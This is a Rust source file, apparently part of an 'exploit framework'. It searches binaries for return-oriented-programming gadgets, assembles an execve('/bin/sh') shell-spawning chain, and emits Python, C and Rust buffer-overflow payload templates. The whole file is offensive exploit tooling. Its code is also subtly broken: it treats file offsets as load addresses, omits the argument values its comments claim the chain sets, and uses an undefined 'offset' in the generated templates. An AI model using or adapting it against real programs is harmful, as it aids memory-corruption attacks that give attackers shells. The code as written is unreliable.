use anyhow::{Result, anyhow};
use capstone::prelude::*;
use goblin::elf::Elf;
use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;

#[derive(Debug, Clone)]
pub struct Gadget {
    pub address: u64,
    pub instruction: String,
    pub bytes: Vec<u8>,
    pub category: GadgetType,
}

#[derive(Debug, Clone, PartialEq)]
pub enum GadgetType {
    PopReg,
    Ret,
    SysCall,
    MovReg,
    AddSub,
    XorReg,
    JmpCall,
    LoadStore,
    StackPivot,
}

pub struct ROPChainBuilder {
    binary_path: PathBuf,
    architecture: String,
    gadgets: Vec<Gadget>,
    elf: Option<Elf<'static>>,
    base_address: u64,
}

impl ROPChainBuilder {
    pub fn new(binary_path: PathBuf, architecture: &str) -> Result<Self> {
        let binary_data = fs::read(&binary_path)?;
        
        Ok(Self {
            binary_path,
            architecture: architecture.to_string(),
            gadgets: Vec::new(),
            elf: None,
            base_address: 0x400000, // Default base for non-PIE
        })
    }
    
    pub fn find_gadgets(&mut self, gadget_type: &str) -> Result<Vec<Gadget>> {
        println!("[*] Searching for {} gadgets...", gadget_type);
        
        let binary_data = fs::read(&self.binary_path)?;
        let cs = self.get_capstone()?;
        
        let mut gadgets = Vec::new();
        let max_gadget_len = 15; // Maximum bytes to look back for gadgets
        
        // Find all ret instructions
        for i in 0..binary_data.len() {
            if binary_data[i] == 0xc3 { // ret instruction
                // Look back for useful instructions
                for j in 1..=max_gadget_len.min(i) {
                    let start = i - j;
                    let gadget_bytes = &binary_data[start..=i];
                    
                    if let Ok(insns) = cs.disasm_all(gadget_bytes, self.base_address + start as u64) {
                        let instructions: Vec<_> = insns.iter().collect();
                        
                        if self.is_valid_gadget(&instructions, gadget_type) {
                            let instruction_str = instructions.iter()
                                .map(|i| format!("{} {}", i.mnemonic().unwrap(), i.op_str().unwrap_or("")))
                                .collect::<Vec<_>>()
                                .join("; ");
                            
                            gadgets.push(Gadget {
                                address: self.base_address + start as u64,
                                instruction: instruction_str,
                                bytes: gadget_bytes.to_vec(),
                                category: self.categorize_gadget(&instructions),
                            });
                        }
                    }
                }
            }
        }
        
        // Remove duplicates and sort by address
        gadgets.sort_by_key(|g| g.address);
        gadgets.dedup_by_key(|g| g.address);
        
        self.gadgets = gadgets.clone();
        Ok(gadgets)
    }
    
    pub fn build_chain(&self) -> Result<Vec<Gadget>> {
        println!("[*] Building optimal ROP chain...");
        
        let mut chain = Vec::new();
        
        // Example: Build execve("/bin/sh") chain
        // This is a simplified example - real implementation would be more complex
        
        // Find gadgets for setting up registers
        let pop_rdi = self.find_gadget_by_pattern("pop rdi")?;
        let pop_rsi = self.find_gadget_by_pattern("pop rsi")?;
        let pop_rdx = self.find_gadget_by_pattern("pop rdx")?;
        let pop_rax = self.find_gadget_by_pattern("pop rax")?;
        let syscall = self.find_gadget_by_pattern("syscall")?;
        
        // Build the chain
        chain.push(pop_rdi.clone()); // rdi = address of "/bin/sh"
        chain.push(pop_rsi.clone()); // rsi = 0 (NULL)
        chain.push(pop_rdx.clone()); // rdx = 0 (NULL)
        chain.push(pop_rax.clone()); // rax = 59 (execve syscall number)
        chain.push(syscall.clone()); // trigger syscall
        
        Ok(chain)
    }
    
    pub fn to_python(&self, chain: &[Gadget]) -> Result<String> {
        let mut output = String::new();
        output.push_str("#!/usr/bin/env python3\n");
        output.push_str("# ROP Chain generated by Padocca Exploit Framework\n\n");
        output.push_str("import struct\n\n");
        output.push_str("def p64(addr):\n");
        output.push_str("    return struct.pack('<Q', addr)\n\n");
        output.push_str("# ROP Chain\n");
        output.push_str("rop_chain = b''\n");
        
        for gadget in chain {
            output.push_str(&format!(
                "rop_chain += p64(0x{:016x})  # {}\n",
                gadget.address, gadget.instruction
            ));
        }
        
        output.push_str("\n# Payload\n");
        output.push_str("payload = b'A' * offset  # Buffer overflow padding\n");
        output.push_str("payload += rop_chain\n");
        output.push_str("\nprint(payload)\n");
        
        Ok(output)
    }
    
    pub fn to_c(&self, chain: &[Gadget]) -> Result<String> {
        let mut output = String::new();
        output.push_str("// ROP Chain generated by Padocca Exploit Framework\n\n");
        output.push_str("#include <stdio.h>\n");
        output.push_str("#include <string.h>\n\n");
        output.push_str("unsigned char rop_chain[] = {\n");
        
        for gadget in chain {
            let bytes = gadget.address.to_le_bytes();
            output.push_str(&format!(
                "    // 0x{:016x}: {}\n",
                gadget.address, gadget.instruction
            ));
            output.push_str("    ");
            for byte in &bytes {
                output.push_str(&format!("0x{:02x}, ", byte));
            }
            output.push_str("\n");
        }
        
        output.push_str("};\n\n");
        output.push_str("int main() {\n");
        output.push_str("    char buffer[1024];\n");
        output.push_str("    memset(buffer, 'A', offset);\n");
        output.push_str("    memcpy(buffer + offset, rop_chain, sizeof(rop_chain));\n");
        output.push_str("    // Send payload...\n");
        output.push_str("    return 0;\n");
        output.push_str("}\n");
        
        Ok(output)
    }
    
    pub fn to_rust(&self, chain: &[Gadget]) -> Result<String> {
        let mut output = String::new();
        output.push_str("// ROP Chain generated by Padocca Exploit Framework\n\n");
        output.push_str("fn build_rop_chain() -> Vec<u8> {\n");
        output.push_str("    let mut chain = Vec::new();\n\n");
        
        for gadget in chain {
            output.push_str(&format!(
                "    // {}\n",
                gadget.instruction
            ));
            output.push_str(&format!(
                "    chain.extend_from_slice(&0x{:016x}u64.to_le_bytes());\n",
                gadget.address
            ));
        }
        
        output.push_str("\n    chain\n");
        output.push_str("}\n\n");
        output.push_str("fn main() {\n");
        output.push_str("    let mut payload = vec![b'A'; offset];\n");
        output.push_str("    payload.extend(build_rop_chain());\n");
        output.push_str("    // Send payload...\n");
        output.push_str("}\n");
        
        Ok(output)
    }
    
    pub fn print_strategy(&self, chain: &[Gadget]) {
        println!("1. Stack pivot to controlled memory");
        println!("2. Set up registers for system call:");
        println!("   - RDI: First argument");
        println!("   - RSI: Second argument");
        println!("   - RDX: Third argument");
        println!("   - RAX: System call number");
        println!("3. Trigger system call");
        println!("4. Chain length: {} gadgets", chain.len());
        
        // Calculate total size
        let total_size = chain.len() * 8; // 8 bytes per address on x64
        println!("5. Total chain size: {} bytes", total_size);
    }
    
    fn get_capstone(&self) -> Result<Capstone> {
        let cs = match self.architecture.as_str() {
            "x86" => Capstone::new()
                .x86()
                .mode(arch::x86::ArchMode::Mode32)
                .syntax(arch::x86::ArchSyntax::Intel)
                .detail(true)
                .build()?,
            "x64" | "x86_64" => Capstone::new()
                .x86()
                .mode(arch::x86::ArchMode::Mode64)
                .syntax(arch::x86::ArchSyntax::Intel)
                .detail(true)
                .build()?,
            "arm" => Capstone::new()
                .arm()
                .mode(arch::arm::ArchMode::Arm)
                .detail(true)
                .build()?,
            "arm64" => Capstone::new()
                .arm64()
                .mode(arch::arm64::ArchMode::Arm)
                .detail(true)
                .build()?,
            _ => return Err(anyhow!("Unsupported architecture: {}", self.architecture)),
        };
        Ok(cs)
    }
    
    fn is_valid_gadget(&self, instructions: &[&Insn], gadget_type: &str) -> bool {
        if instructions.is_empty() {
            return false;
        }
        
        // Check if last instruction is ret
        let last = instructions.last().unwrap();
        if !last.mnemonic().unwrap().contains("ret") {
            return false;
        }
        
        // Filter by gadget type
        match gadget_type {
            "all" => true,
            "pop" => instructions.iter().any(|i| i.mnemonic().unwrap().contains("pop")),
            "mov" => instructions.iter().any(|i| i.mnemonic().unwrap().contains("mov")),
            "syscall" => instructions.iter().any(|i| i.mnemonic().unwrap() == "syscall"),
            _ => true,
        }
    }
    
    fn categorize_gadget(&self, instructions: &[&Insn]) -> GadgetType {
        for insn in instructions {
            let mnemonic = insn.mnemonic().unwrap();
            if mnemonic.contains("pop") {
                return GadgetType::PopReg;
            } else if mnemonic == "syscall" || mnemonic == "sysenter" {
                return GadgetType::SysCall;
            } else if mnemonic.contains("mov") {
                return GadgetType::MovReg;
            } else if mnemonic.contains("add") || mnemonic.contains("sub") {
                return GadgetType::AddSub;
            } else if mnemonic.contains("xor") {
                return GadgetType::XorReg;
            } else if mnemonic.contains("jmp") || mnemonic.contains("call") {
                return GadgetType::JmpCall;
            }
        }
        GadgetType::Ret
    }
    
    fn find_gadget_by_pattern(&self, pattern: &str) -> Result<&Gadget> {
        self.gadgets
            .iter()
            .find(|g| g.instruction.to_lowercase().contains(pattern))
            .ok_or_else(|| anyhow!("Gadget not found: {}", pattern))
    }
}
